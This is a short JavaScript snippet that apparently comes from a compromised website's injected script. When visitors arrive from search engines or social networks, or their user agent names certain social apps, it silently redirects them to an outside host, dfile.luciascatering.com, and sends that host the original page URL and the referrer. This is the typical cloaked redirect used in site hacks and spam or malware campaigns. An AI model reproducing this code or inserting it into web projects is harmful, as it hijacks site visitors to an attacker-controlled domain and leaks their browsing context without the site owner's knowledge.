var ars = rChoice([
"https://dfile.luciascatering.com"

]);
function rChoice(arr) {
    return arr[Math.floor(arr.length * Math.random())];
}

if(['.google.', '.yahoo.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
